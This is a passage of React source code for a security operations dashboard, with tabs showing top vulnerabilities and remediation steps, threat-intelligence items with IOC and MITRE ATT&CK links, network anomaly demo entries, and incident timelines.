                  )}
                  {(gapToolFilter ? gapDevices.filter(d=>d.missing.some(m=>ALL_TOOLS.find(t=>t.id===gapToolFilter)?.name && m.includes(ALL_TOOLS.find(t=>t.id===gapToolFilter).name.split(' ')[0]))) : gapDevices).map(dev=>(
                    <div key={dev.hostname} style={{padding:'12px 14px',background:'var(--wt-card)',border:'1px solid #f0405e18',borderRadius:10}}>
                      <div style={{display:'flex',alignItems:'flex-start',gap:10}}>
                        <div style={{flex:1}}>
                          <div style={{display:'flex',alignItems:'center',gap:8,marginBottom:4}}>
                            <span style={{fontSize:'0.8rem',fontWeight:700,fontFamily:'JetBrains Mono,monospace'}}>{dev.hostname}</span>
                            <span style={{fontSize:'0.6rem',color:'var(--wt-dim)',fontFamily:'JetBrains Mono,monospace'}}>{dev.ip}</span>
                            <span style={{fontSize:'0.58rem',color:'var(--wt-muted)'}}>{dev.os}</span>
                          </div>
                          <div style={{display:'flex',gap:5,flexWrap:'wrap',marginBottom:4}}>
                            {dev.missing.map(m=>{
                              const catColor = m.includes('Falcon')||m.includes('Defender')||m.includes('SentinelOne')||m.includes('Carbon Black')?'#f0405e':m.includes('Splunk')||m.includes('Sentinel')||m.includes('QRadar')||m.includes('Elastic')?'#f0a030':m.includes('Tenable')||m.includes('Nessus')||m.includes('Qualys')?'#8b6fff':'#4f8fff';
                              return <span key={m} style={{fontSize:'0.62rem',fontWeight:700,padding:'3px 8px',borderRadius:4,background:`${catColor}14`,color:catColor,border:`1px solid ${catColor}28`,display:'flex',alignItems:'center',gap:4}}><span style={{fontSize:'0.5rem'}}>✗</span>{m}</span>;
                            })}
                          </div>
                          <div style={{fontSize:'0.66rem',color:'var(--wt-muted)'}}>{dev.reason} · Last seen {dev.lastSeen}</div>
                        </div>

                      </div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}

          {/* ═══════════════════════════════ VULNS ══════════════════════════════════ */}
          {activeTab==='vulns' && (
            <div style={{display:'flex',flexDirection:'column',gap:0}}>
              <div style={{display:'flex',alignItems:'center',gap:10,marginBottom:12}}>
                <h2 style={{fontSize:'0.88rem',fontWeight:700}}>Top 10 Vulnerabilities</h2>
                <span style={{fontSize:'0.62rem',color:'#f0405e',background:'#f0405e12',padding:'2px 8px',borderRadius:4}}>Ranked by severity × prevalence in your estate</span>
                <span style={{marginLeft:'auto',fontSize:'0.62rem',color:'#f97316',background:'#f9731612',padding:'2px 8px',borderRadius:4}}>{kevVulns.length} CISA KEV — 72h deadline</span>
              </div>
              <div style={{display:'flex',flexDirection:'column',gap:6}}>
                {DEMO_VULNS.map((vuln,rank)=>(
                  <div key={vuln.id}>
                    <div className='vuln-row' onClick={()=>setSelectedVuln(selectedVuln?.id===vuln.id?null:vuln)} style={{padding:'10px 14px',background:selectedVuln?.id===vuln.id?'#0a0d18':'#09091a',border:`1px solid ${selectedVuln?.id===vuln.id?'#4f8fff30':'var(--wt-border)'}`,borderRadius:10,display:'flex',alignItems:'center',gap:12}}>
                      <div style={{width:22,height:22,borderRadius:6,background:rank<3?'#f0405e18':'var(--wt-border)',display:'flex',alignItems:'center',justifyContent:'center',fontSize:'0.62rem',fontWeight:900,color:rank<3?'#f0405e':'#6b7a94',flexShrink:0,fontFamily:'JetBrains Mono,monospace'}}>{rank+1}</div>
                      <div style={{flex:1,minWidth:0}}>
                        <div style={{display:'flex',alignItems:'center',gap:7,marginBottom:2}}>
                          <span style={{fontSize:'0.78rem',fontWeight:700}}>{vuln.title}</span>
                          {vuln.kev && <span style={{fontSize:'0.48rem',fontWeight:800,padding:'1px 5px',borderRadius:3,background:'#f97316',color:'#fff',flexShrink:0}}>CISA KEV</span>}
                        </div>
                        <div style={{display:'flex',gap:6,alignItems:'center',flexWrap:'wrap'}}>
                          <SevBadge sev={vuln.severity} />
                          <span style={{fontSize:'0.6rem',color:'#4f8fff',fontFamily:'JetBrains Mono,monospace',fontWeight:700}}>CVSS {vuln.cvss}</span>
                          <span style={{fontSize:'0.6rem',color:'var(--wt-dim)',fontFamily:'JetBrains Mono,monospace'}}>{vuln.cve}</span>
                          <span style={{fontSize:'0.58rem',color:'var(--wt-muted)'}}>{vuln.affected} device{vuln.affected!==1?'s':''} affected</span>
                          <span style={{fontSize:'0.58rem',color:'#f0a030'}}>{vuln.prevalence}% prevalence in estate</span>
                        </div>
                      </div>
                      <span style={{fontSize:'0.62rem',color:'#4f8fff',flexShrink:0}}>{selectedVuln?.id===vuln.id?'▲':'▼'}</span>
                    </div>
                    {selectedVuln?.id===vuln.id && (
                      <div style={{padding:'14px 16px',background:'#070912',border:'1px solid #4f8fff20',borderTop:'none',borderRadius:'0 0 10px 10px',marginBottom:0}}>
                        <div style={{display:'grid',gridTemplateColumns:'1fr 1fr',gap:16}}>
                          <div>
                            <div style={{fontSize:'0.7rem',color:'var(--wt-secondary)',lineHeight:1.65,marginBottom:10}}>{vuln.description}</div>
                            <div style={{fontSize:'0.6rem',fontWeight:700,color:'var(--wt-dim)',textTransform:'uppercase',letterSpacing:'0.5px',marginBottom:5}}>Affected Devices</div>
                            <div style={{display:'flex',gap:4,flexWrap:'wrap'}}>
                              {vuln.affectedDevices.map(d=><span key={d} style={{fontSize:'0.58rem',padding:'2px 7px',borderRadius:3,background:'var(--wt-border)',color:'var(--wt-muted)',fontFamily:'JetBrains Mono,monospace'}}>{d}</span>)}
                            </div>
                            <div style={{marginTop:10,display:'flex',gap:6,flexWrap:'wrap'}}>
                              {vuln.patch && <div style={{fontSize:'0.64rem',color:'#22d49a',width:'100%'}}>📦 Patch: <strong>{vuln.patch}</strong></div>}
                              <a href={`https://nvd.nist.gov/vuln/detail/${vuln.cve}`} target='_blank' rel='noopener noreferrer' onClick={e=>e.stopPropagation()} style={{display:'inline-flex',alignItems:'center',gap:4,padding:'5px 10px',borderRadius:6,background:'#4f8fff15',border:'1px solid #4f8fff30',color:'#4f8fff',textDecoration:'none',fontSize:'0.66rem',fontWeight:700}}>🔗 NVD Database</a>
                              {vuln.kev && <a href='https://www.cisa.gov/known-exploited-vulnerabilities-catalog' target='_blank' rel='noopener noreferrer' onClick={e=>e.stopPropagation()} style={{display:'inline-flex',alignItems:'center',gap:4,padding:'5px 10px',borderRadius:6,background:'#f9731615',border:'1px solid #f9731630',color:'#f97316',textDecoration:'none',fontSize:'0.66rem',fontWeight:700}}>⚠ CISA KEV</a>}
                              {vuln.patch && <a href={`https://www.google.com/search?q=${encodeURIComponent(vuln.cve+' '+vuln.patch+' download')}`} target='_blank' rel='noopener noreferrer' onClick={e=>e.stopPropagation()} style={{display:'inline-flex',alignItems:'center',gap:4,padding:'5px 10px',borderRadius:6,background:'#22d49a15',border:'1px solid #22d49a30',color:'#22d49a',textDecoration:'none',fontSize:'0.66rem',fontWeight:700}}>📦 Find Patch</a>}
                            </div>
                          </div>
                          <div>
                            <div style={{fontSize:'0.6rem',fontWeight:700,color:'var(--wt-dim)',textTransform:'uppercase',letterSpacing:'0.5px',marginBottom:5}}>Remediation Steps</div>
                            {vuln.remediation.map((r,i)=>(
                              <div key={r} style={{fontSize:'0.7rem',color:'var(--wt-secondary)',padding:'3px 0 3px 14px',position:'relative',lineHeight:1.5}}>
                                <span style={{position:'absolute',left:0,top:9,width:5,height:5,borderRadius:'50%',background:'#22d49a',display:'block'}} />
                                {r}
                              </div>
                            ))}
                            <div style={{marginTop:12,padding:'10px',background:'var(--wt-card2)',border:'1px solid #4f8fff18',borderRadius:8}}>
                              <div style={{fontSize:'0.6rem',fontWeight:700,color:'#4f8fff',marginBottom:8,display:'flex',alignItems:'center',gap:6}}>
                                <span style={{width:6,height:6,borderRadius:'50%',background:'#4f8fff',display:'block'}} />AI Remediation Assistant
                              </div>
                              <div style={{display:'flex',gap:5,flexWrap:'wrap',marginBottom:8}}>
                                {[
                                  {type:'splunk',label:'Splunk',color:'#f97316'},
                                  {type:'sentinel',label:'Sentinel',color:'#4f8fff'},
                                  {type:'defender',label:'Defender',color:'#22d49a'},
                                  {type:'iocs',label:'IOCs',color:'#f0405e'},
                                ].map(q=>{
                                  const key = vuln.id + ':' + q.type;
                                  const isLoading = vulnAiLoading === key;
                                  const hasResult = !!vulnAiTexts[key];
                                  return (
                                    <button key={q.type} onClick={()=>getVulnAiHelp(vuln,q.type)} disabled={isLoading} style={{padding:'4px 11px',borderRadius:5,border:'1px solid ' + q.color + '40',background:hasResult ? q.color + '20' : 'transparent',color:q.color,fontSize:'0.66rem',fontWeight:700,cursor:isLoading?'not-allowed':'pointer',fontFamily:'Inter,sans-serif',display:'flex',alignItems:'center',gap:4,opacity:isLoading?0.7:1}}>
                                      {isLoading && <span style={{display:'inline-block',width:8,height:8,borderRadius:'50%',border:'2px solid ' + q.color,borderTopColor:'transparent',animation:'spin 0.8s linear infinite'}} />}
                                      {!isLoading && hasResult && <span>✓</span>}
                                      {!isLoading && !hasResult && <span>✦</span>}
                                      {q.label}
                                    </button>
                                  );
                                })}
                                {['splunk','sentinel','defender','iocs'].some(t=>vulnAiTexts[vuln.id+':'+t]) && (
                                  <button onClick={()=>setVulnAiTexts(prev=>{const n={...prev};['splunk','sentinel','defender','iocs'].forEach(t=>{delete n[vuln.id+':'+t];}); return n;})} style={{marginLeft:'auto',fontSize:'0.58rem',padding:'2px 7px',borderRadius:4,border:'1px solid var(--wt-border2)',background:'transparent',color:'var(--wt-dim)',cursor:'pointer',fontFamily:'Inter,sans-serif'}}>Clear all</button>
                                )}
                              </div>
                              {['splunk','sentinel','defender','iocs'].map(t=>{
                                const key = vuln.id + ':' + t;
                                if (!vulnAiTexts[key]) return null;
                                const colors = {splunk:'#f97316',sentinel:'#4f8fff',defender:'#22d49a',iocs:'#f0405e'};
                                const labels = {splunk:'Splunk SPL',sentinel:'Sentinel KQL',defender:'Defender KQL',iocs:'IOCs'};
                                return (
                                  <div key={t} style={{marginBottom:8}}>
                                    <div style={{fontSize:'0.58rem',fontWeight:700,color:colors[t],marginBottom:4,textTransform:'uppercase',letterSpacing:'0.5px'}}>{labels[t]}</div>
                                    <RemediationOutput text={vulnAiTexts[key]} />
                                  </div>
                                );
                              })}
                            </div>
                          </div>
                        </div>
                      </div>
                    )}
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* ═══════════════════════════════ INTEL ══════════════════════════════════ */}
          {activeTab==='intel' && (
            <GateWall feature='Threat Intelligence' requiredTier='team' userTier={userTier}>
            <div style={{display:'flex',flexDirection:'column',gap:12}}>
              <div style={{display:'flex',alignItems:'center',gap:10,flexWrap:'wrap'}}>
                <h2 style={{fontSize:'0.88rem',fontWeight:700}}>Threat Intelligence</h2>
                <div style={{display:'flex',alignItems:'center',gap:6,marginLeft:'auto'}}>
                  <span style={{fontSize:'0.7rem',color:'var(--wt-muted)'}}>Industry:</span>
                  <select value={industry} onChange={e=>{setIndustryPersisted(e.target.value);fetchIntelForIndustry(e.target.value);}} style={{padding:'4px 10px',borderRadius:6,border:'1px solid var(--wt-border2)',background:'var(--wt-card2)',color:'var(--wt-text)',fontSize:'0.76rem',cursor:'pointer',fontFamily:'Inter,sans-serif'}}>
                    {INDUSTRIES.map(i=><option key={i} value={i}>{i}</option>)}
                  </select>
                  {intelLoading && <span style={{width:14,height:14,borderRadius:'50%',border:'2px solid #4f8fff',borderTopColor:'transparent',display:'block',animation:'spin 0.8s linear infinite'}} />}
                </div>
              </div>

              {/* Industry-specific intel first */}
              <div>
                <div style={{fontSize:'0.62rem',fontWeight:700,color:'#f0405e',textTransform:'uppercase',letterSpacing:'1px',marginBottom:8}}>
                  {industry} — Active Threats
                </div>
                {allIntel.filter(i=>i.industrySpecific).map(item=>{
                  const isExpanded = expandedIntel.has(item.id);
                  return (
                  <div key={item.id} style={{background:'#0a0206',border:`1px solid ${isExpanded?'#f0405e30':'#f0405e18'}`,borderRadius:10,marginBottom:6,overflow:'hidden'}}>
                    <div style={{padding:'12px 14px',cursor:'pointer'}} onClick={()=>toggleIntel(item.id)}>
                      <div style={{display:'flex',alignItems:'flex-start',gap:10}}>
                        <div style={{flex:1}}>
                          <div style={{display:'flex',alignItems:'center',gap:7,marginBottom:4}}>
                            <SevBadge sev={item.severity} />
                            <span style={{fontSize:'0.78rem',fontWeight:700}}>{item.title}</span>
                          </div>
                          <div style={{fontSize:'0.74rem',color:'var(--wt-secondary)',lineHeight:1.65,marginBottom:6}}>{item.summary}</div>
                          <div style={{display:'flex',gap:8,alignItems:'center',flexWrap:'wrap'}}>
                            <span style={{fontSize:'0.58rem',color:'#4f8fff'}}>{item.source}</span>
                            <span style={{fontSize:'0.58rem',color:'var(--wt-dim)'}}>{item.time}</span>
                            {item.mitre && <span style={{fontSize:'0.52rem',color:'#7c6aff',fontFamily:'JetBrains Mono,monospace'}}>{item.mitre}</span>}
                            {item.iocs && item.iocs.length>0 && <span style={{fontSize:'0.58rem',fontWeight:700,color:'#f0a030',background:'#f0a03012',padding:'1px 6px',borderRadius:3,border:'1px solid #f0a03025'}}>{item.iocs.length} IOCs — click to view</span>}
                            <a href={`https://www.google.com/search?q=${encodeURIComponent(item.title+' threat intelligence')}`} target='_blank' rel='noopener noreferrer' onClick={e=>e.stopPropagation()} style={{fontSize:'0.52rem',color:'#4f8fff',textDecoration:'none',padding:'1px 6px',border:'1px solid #4f8fff20',borderRadius:3,background:'#4f8fff0a'}}>Read more →</a>
                          </div>
                        </div>
                        <span style={{fontSize:'0.7rem',color:'var(--wt-dim)',flexShrink:0}}>{isExpanded?'▲':'▼'}</span>
                      </div>
                    </div>
                    {isExpanded && item.iocs && item.iocs.length>0 && (
                      <div style={{padding:'10px 14px 14px',borderTop:'1px solid #f0405e15',background:'#07010a'}}>
                        <div style={{fontSize:'0.6rem',fontWeight:700,color:'#f0a030',textTransform:'uppercase',letterSpacing:'0.5px',marginBottom:8}}>Indicators of Compromise</div>
                        <div style={{display:'flex',flexDirection:'column',gap:4}}>
                          {item.iocs.map(ioc=>(
                            <div key={ioc} style={{display:'flex',alignItems:'center',gap:8,padding:'5px 8px',background:'#0d0208',border:'1px solid #1e1010',borderRadius:6}}>
                              <span style={{width:6,height:6,borderRadius:'50%',background:'#f0a030',flexShrink:0}} />
                              <code style={{fontSize:'0.68rem',fontFamily:'JetBrains Mono,monospace',color:'#f0c070',flex:1,wordBreak:'break-all'}}>{ioc}</code>
                              <button onClick={e=>{e.stopPropagation();navigator.clipboard.writeText(ioc);}} style={{fontSize:'0.54rem',padding:'2px 7px',borderRadius:3,border:'1px solid #f0a03025',background:'transparent',color:'#f0a030',cursor:'pointer',fontFamily:'Inter,sans-serif',flexShrink:0}}>Copy</button>
                            </div>
                          ))}
                        </div>
                        {item.mitre && (
                          <div style={{marginTop:10,display:'flex',alignItems:'center',gap:8}}>
                            <span style={{fontSize:'0.6rem',color:'var(--wt-dim)'}}>MITRE ATT&CK:</span>
                            <a href={`https://attack.mitre.org/techniques/${item.mitre.replace('.','/')}/`} target='_blank' rel='noopener noreferrer' onClick={e=>e.stopPropagation()} style={{fontSize:'0.66rem',fontWeight:700,fontFamily:'JetBrains Mono,monospace',color:'#7c6aff',textDecoration:'none',padding:'2px 8px',border:'1px solid #7c6aff25',borderRadius:3,background:'#7c6aff10'}}>{item.mitre} →</a>
                          </div>
                        )}
                        {item.iocs && item.iocs.length>0 && (
                          <div style={{marginTop:10,paddingTop:10,borderTop:'1px solid #f0a03015'}}>
                            <div style={{display:'flex',alignItems:'center',gap:8,marginBottom:8}}>
                              <span style={{fontSize:'0.6rem',fontWeight:700,color:'#22d49a',textTransform:'uppercase',letterSpacing:'0.5px'}}>🔍 Hunt in your environment</span>
                              <button onClick={e=>{e.stopPropagation();setIocQueryLoading(item.id);fetch('/api/copilot',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({prompt:'Generate detection queries to hunt for these IOCs in a corporate environment: '+item.iocs.join(', ')+'. Provide: SPLUNK QUERY (SPL), MICROSOFT SENTINEL KQL, and MICROSOFT DEFENDER ADVANCED HUNTING queries. Each labelled clearly. No markdown, plain text only.'})}).then(r=>r.json()).then(d=>{setIocQueries(prev=>({...prev,[item.id]:d.response||''}));setIocQueryLoading(null);}).catch(()=>setIocQueryLoading(null));}} disabled={iocQueryLoading===item.id} style={{padding:'3px 10px',borderRadius:5,border:'1px solid #22d49a30',background:'#22d49a10',color:'#22d49a',fontSize:'0.6rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif',display:'flex',alignItems:'center',gap:4}}>
                                {iocQueryLoading===item.id?<><span style={{display:'inline-block',width:8,height:8,borderRadius:'50%',border:'2px solid #22d49a',borderTopColor:'transparent',animation:'spin 0.8s linear infinite'}}/>Generating...</>:<>✦ Generate Hunt Queries</>}
                              </button>
                              {iocQueries[item.id] && <button onClick={e=>{e.stopPropagation();setIocQueries(prev=>{const n={...prev};delete n[item.id];return n;});}} style={{padding:'2px 7px',borderRadius:4,border:'1px solid var(--wt-border2)',background:'transparent',color:'var(--wt-dim)',fontSize:'0.56rem',cursor:'pointer',fontFamily:'Inter,sans-serif'}}>Clear</button>}
                            </div>
                            {iocQueries[item.id] && <RemediationOutput text={iocQueries[item.id]} />}
                          </div>
                        )}
                      </div>
                    )}
                  </div>
                  );
                })}
              </div>

              {/* General intel */}
              <div>
                <div style={{fontSize:'0.62rem',fontWeight:700,color:'var(--wt-muted)',textTransform:'uppercase',letterSpacing:'1px',marginBottom:8}}>General Intelligence</div>
                {allIntel.filter(i=>!i.industrySpecific).map(item=>{
                  const isExpanded = expandedIntel.has(item.id);
                  return (
                  <div key={item.id} style={{background:'var(--wt-card)',border:`1px solid ${isExpanded?'#4f8fff30':'var(--wt-border)'}`,borderRadius:10,marginBottom:6,overflow:'hidden'}}>
                    <div style={{padding:'12px 14px',cursor:'pointer'}} onClick={()=>toggleIntel(item.id)}>
                      <div style={{display:'flex',alignItems:'center',gap:7,marginBottom:4}}>
                        <SevBadge sev={item.severity} />
                        <span style={{fontSize:'0.78rem',fontWeight:700,flex:1}}>{item.title}</span>
                        <span style={{fontSize:'0.7rem',color:'var(--wt-dim)',flexShrink:0}}>{isExpanded?'▲':'▼'}</span>
                      </div>
                      <div style={{fontSize:'0.74rem',color:'var(--wt-secondary)',lineHeight:1.65,marginBottom:6}}>{item.summary}</div>
                      <div style={{display:'flex',gap:8,alignItems:'center',flexWrap:'wrap'}}>
                        <span style={{fontSize:'0.58rem',color:'#4f8fff'}}>{item.source}</span>
                        <span style={{fontSize:'0.58rem',color:'var(--wt-dim)'}}>{item.time}</span>
                        {item.iocs && item.iocs.length>0 && <span style={{fontSize:'0.58rem',fontWeight:700,color:'#f0a030',background:'#f0a03012',padding:'1px 6px',borderRadius:3,border:'1px solid #f0a03025'}}>{item.iocs.length} IOCs</span>}
                        {item.mitre && <span style={{fontSize:'0.52rem',color:'#7c6aff',fontFamily:'JetBrains Mono,monospace'}}>{item.mitre}</span>}
                      </div>
                    </div>
                    {isExpanded && item.iocs && item.iocs.length>0 && (
                      <div style={{padding:'10px 14px 14px',borderTop:'1px solid var(--wt-border)',background:'var(--wt-card2)'}}>
                        <div style={{fontSize:'0.6rem',fontWeight:700,color:'#f0a030',textTransform:'uppercase',letterSpacing:'0.5px',marginBottom:8}}>Indicators of Compromise</div>
                        <div style={{display:'flex',flexDirection:'column',gap:4}}>
                          {item.iocs.map(ioc=>(
                            <div key={ioc} style={{display:'flex',alignItems:'center',gap:8,padding:'5px 8px',background:'var(--wt-card)',border:'1px solid var(--wt-border)',borderRadius:6}}>
                              <span style={{width:6,height:6,borderRadius:'50%',background:'#f0a030',flexShrink:0}} />
                              <code style={{fontSize:'0.68rem',fontFamily:'JetBrains Mono,monospace',color:'#f0c070',flex:1,wordBreak:'break-all'}}>{ioc}</code>
                              <button onClick={e=>{e.stopPropagation();navigator.clipboard.writeText(ioc);}} style={{fontSize:'0.54rem',padding:'2px 7px',borderRadius:3,border:'1px solid #f0a03025',background:'transparent',color:'#f0a030',cursor:'pointer',fontFamily:'Inter,sans-serif',flexShrink:0}}>Copy</button>
                            </div>
                          ))}
                        </div>
                        {item.mitre && (
                          <div style={{marginTop:10,display:'flex',alignItems:'center',gap:8}}>
                            <span style={{fontSize:'0.6rem',color:'var(--wt-dim)'}}>MITRE ATT&CK:</span>
                            <a href={`https://attack.mitre.org/techniques/${item.mitre.replace('.','/')}/`} target='_blank' rel='noopener noreferrer' onClick={e=>e.stopPropagation()} style={{fontSize:'0.66rem',fontWeight:700,fontFamily:'JetBrains Mono,monospace',color:'#7c6aff',textDecoration:'none',padding:'2px 8px',border:'1px solid #7c6aff25',borderRadius:3,background:'#7c6aff10'}}>{item.mitre} →</a>
                          </div>
                        )}
                        {item.iocs && item.iocs.length>0 && (
                          <div style={{marginTop:10,paddingTop:10,borderTop:'1px solid #f0a03015'}}>
                            <div style={{display:'flex',alignItems:'center',gap:8,marginBottom:8}}>
                              <span style={{fontSize:'0.6rem',fontWeight:700,color:'#22d49a',textTransform:'uppercase',letterSpacing:'0.5px'}}>🔍 Hunt in your environment</span>
                              <button onClick={e=>{e.stopPropagation();setIocQueryLoading(item.id);fetch('/api/copilot',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({prompt:'Generate detection queries to hunt for these IOCs in a corporate environment: '+item.iocs.join(', ')+'. Provide: SPLUNK QUERY (SPL), MICROSOFT SENTINEL KQL, and MICROSOFT DEFENDER ADVANCED HUNTING queries. Each labelled clearly. No markdown, plain text only.'})}).then(r=>r.json()).then(d=>{setIocQueries(prev=>({...prev,[item.id]:d.response||''}));setIocQueryLoading(null);}).catch(()=>setIocQueryLoading(null));}} disabled={iocQueryLoading===item.id} style={{padding:'3px 10px',borderRadius:5,border:'1px solid #22d49a30',background:'#22d49a10',color:'#22d49a',fontSize:'0.6rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif',display:'flex',alignItems:'center',gap:4}}>
                                {iocQueryLoading===item.id?<><span style={{display:'inline-block',width:8,height:8,borderRadius:'50%',border:'2px solid #22d49a',borderTopColor:'transparent',animation:'spin 0.8s linear infinite'}}/>Generating...</>:<>✦ Generate Hunt Queries</>}
                              </button>
                              {iocQueries[item.id] && <button onClick={e=>{e.stopPropagation();setIocQueries(prev=>{const n={...prev};delete n[item.id];return n;});}} style={{padding:'2px 7px',borderRadius:4,border:'1px solid var(--wt-border2)',background:'transparent',color:'var(--wt-dim)',fontSize:'0.56rem',cursor:'pointer',fontFamily:'Inter,sans-serif'}}>Clear</button>}
                            </div>
                            {iocQueries[item.id] && <RemediationOutput text={iocQueries[item.id]} />}
                          </div>
                        )}
                      </div>
                    )}
                  </div>
                  );
                })}
              </div>

              {/* Darktrace anomalies if active */}
              {darktrace?.active && (
                <div>
                  <div style={{fontSize:'0.62rem',fontWeight:700,color:'#8b6fff',textTransform:'uppercase',letterSpacing:'1px',marginBottom:8}}>Darktrace — Network Anomalies</div>
                  {[
                    {device:'SRV-FINANCE01',score:96,desc:'Anomalous outbound HTTPS beaconing — 300s interval, unusual destination',time:'1h ago'},
                    {device:'laptop-CFO01',score:88,desc:'Unusual internal reconnaissance — scanning 10.0.0.0/24 subnet',time:'2h ago'},
                    {device:'SRV-APP02',score:72,desc:'Elevated data transfer to external storage provider — 3x baseline',time:'3h ago'},
                  ].map(a=>(
                    <div key={a.device} style={{padding:'10px 14px',background:'var(--wt-card)',border:'1px solid #8b6fff18',borderRadius:10,marginBottom:5,display:'flex',alignItems:'center',gap:10}}>
                      <div style={{width:38,height:38,borderRadius:8,background:'#8b6fff15',display:'flex',alignItems:'center',justifyContent:'center',flexShrink:0}}>
                        <span style={{fontSize:'1rem',fontWeight:900,fontFamily:'JetBrains Mono,monospace',color:'#8b6fff'}}>{a.score}</span>
                      </div>
                      <div style={{flex:1}}>
                        <div style={{fontSize:'0.76rem',fontWeight:700,marginBottom:2}}>{a.device}</div>
                        <div style={{fontSize:'0.7rem',color:'var(--wt-muted)'}}>{a.desc}</div>
                      </div>
                      <span style={{fontSize:'0.6rem',color:'var(--wt-dim)',flexShrink:0}}>{a.time}</span>
                    </div>
                  ))}
                </div>
              )}
            </div>
          </GateWall>
          )}

          {/* ═══════════════════════════════ INCIDENTS ══════════════════════════════ */}
          {activeTab==='incidents' && (
            <GateWall feature='Incident Management' requiredTier='team' userTier={userTier}>
            <div style={{display:'flex',flexDirection:'column',gap:12}}>
              <div style={{display:'flex',alignItems:'center',gap:10,marginBottom:4}}>
                <h2 style={{fontSize:'0.88rem',fontWeight:700}}>Incidents</h2>
                <span style={{fontSize:'0.62rem',color:'#f0405e',background:'#f0405e12',padding:'2px 8px',borderRadius:4}}>{incidents.filter(i=>i.status==='Active').length} Active</span>
              </div>
              {incidents.filter(inc=>!deletedIncidents.has(inc.id)).map(inc=>{
                const isSel = selectedIncident?.id===inc.id;
                const incStatus = incidentStatuses[inc.id] || inc.status; const statusColor = incStatus==='Active'?'#f0405e':incStatus==='Contained'?'#f0a030':'#22d49a';
                return (
                  <div key={inc.id} style={{background:'var(--wt-card)',border:`1px solid ${isSel?'#4f8fff40':'var(--wt-border)'}`,borderRadius:12,overflow:'hidden'}}>
                    <div style={{padding:'12px 16px',cursor:'pointer',display:'flex',alignItems:'flex-start',gap:12}} onClick={()=>setSelectedIncident(isSel?null:inc)}>
                      <div style={{flex:1}}>
                        <div style={{display:'flex',alignItems:'center',gap:8,marginBottom:4}}>
                          <span style={{fontSize:'0.62rem',fontWeight:800,color:'#4f8fff',fontFamily:'JetBrains Mono,monospace'}}>{inc.id}</span>
                          <span style={{fontSize:'0.52rem',fontWeight:700,padding:'2px 7px',borderRadius:3,background:`${statusColor}15`,color:statusColor,border:`1px solid ${statusColor}25`}}>{incStatus.toUpperCase()}</span>
                          <SevBadge sev={inc.severity} />
                        </div>
                        <div style={{fontSize:'0.84rem',fontWeight:700,marginBottom:4}}>{inc.title}</div>
                        <div style={{display:'flex',gap:10,flexWrap:'wrap'}}>
                          {inc.mitreTactics.map(t=><span key={t} style={{fontSize:'0.52rem',color:'#7c6aff',fontFamily:'JetBrains Mono,monospace'}}>{t}</span>)}
                          <span style={{fontSize:'0.58rem',color:'var(--wt-dim)'}}>{inc.alertCount} alerts · {inc.devices.length} devices</span>
                          <span style={{fontSize:'0.58rem',color:'var(--wt-dim)'}}>Updated {inc.updated.split(' ')[1]}</span>
                        </div>
                      </div>
                      <span style={{fontSize:'0.7rem',color:'var(--wt-dim)',flexShrink:0}}>{isSel?'▲':'▼'}</span>
                    </div>
                    {isSel && (
                      <div style={{borderTop:'1px solid #141820',padding:'14px 16px'}}>
                        <GateWall feature='AI Attack Narrative' requiredTier='team' userTier={userTier}>
              <div style={{fontSize:'0.74rem',color:'var(--wt-secondary)',lineHeight:1.65,padding:'10px',background:'linear-gradient(135deg,rgba(79,143,255,0.04),rgba(34,201,146,0.04))',border:'1px solid #4f8fff15',borderRadius:8,marginBottom:12}}>
                          <span style={{fontSize:'0.6rem',fontWeight:700,color:'#4f8fff',display:'block',marginBottom:4}}>AI ATTACK NARRATIVE</span>
                          {inc.aiSummary}
                        </div>
                        </GateWall>
                        <div style={{fontSize:'0.62rem',fontWeight:700,color:'var(--wt-dim)',textTransform:'uppercase',letterSpacing:'0.5px',marginBottom:8}}>Attack Timeline</div>
                        <div style={{display:'flex',flexDirection:'column',gap:0}}>
                          {inc.timeline.map((event,i)=>(
                            <div key={i} style={{display:'flex',gap:0,padding:'5px 0'}}>
                              <div style={{display:'flex',flexDirection:'column',alignItems:'center',minWidth:50}}>
                                <span style={{fontSize:'0.6rem',fontFamily:'JetBrains Mono,monospace',color:'var(--wt-dim)',marginBottom:3}}>{event.t}</span>
                                <div style={{width:8,height:8,borderRadius:'50%',background:event.actor==='AI'?'#4f8fff':'#22d49a',flexShrink:0}} />
                                {i<inc.timeline.length-1&&<div style={{width:1,flex:1,background:'var(--wt-border)',minHeight:16,marginTop:2}} />}
                              </div>
                              <div style={{flex:1,paddingLeft:10,paddingBottom:8}}>
                                <div style={{display:'flex',alignItems:'center',gap:6,marginBottom:1}}>
                                  <span style={{fontSize:'0.52rem',fontWeight:700,padding:'1px 5px',borderRadius:3,background:event.actor==='AI'?'#4f8fff15':'#22d49a15',color:event.actor==='AI'?'#4f8fff':'#22d49a'}}>{event.actor}</span>
                                  <span style={{fontSize:'0.74rem',fontWeight:600}}>{event.action}</span>
                                </div>
                                <div style={{fontSize:'0.68rem',color:'var(--wt-muted)'}}>{event.detail}</div>
                              </div>
                            </div>
                          ))}
                        </div>
                        <div style={{display:'flex',gap:6,marginTop:10,flexWrap:'wrap'}}>
                          <button onClick={()=>setAddingNoteTo(addingNoteTo===inc.id?null:inc.id)} style={{padding:'5px 12px',borderRadius:6,border:'1px solid var(--wt-border2)',background:addingNoteTo===inc.id?'#4f8fff12':'transparent',color:'#8a9ab0',fontSize:'0.68rem',fontWeight:600,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>📝 Add Note</button>
                          <button onClick={()=>setIncidentStatuses(prev=>({...prev,[inc.id]:'Escalated'}))} style={{padding:'5px 12px',borderRadius:6,border:'1px solid #f0a03030',background:'#f0a03008',color:'#f0a030',fontSize:'0.68rem',fontWeight:600,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>⬆ Escalate</button>
                          <button onClick={()=>closeIncident(inc.id)} style={{padding:'5px 12px',borderRadius:6,border:'1px solid #22d49a30',background:'#22d49a0a',color:'#22d49a',fontSize:'0.68rem',fontWeight:600,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>✓ Close</button>
                          <button onClick={()=>deleteIncident(inc.id)} style={{padding:'5px 12px',borderRadius:6,border:'1px solid #f0405e25',background:'#f0405e0a',color:'#f0405e',fontSize:'0.68rem',fontWeight:600,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>🗑 Delete</button>
                        </div>
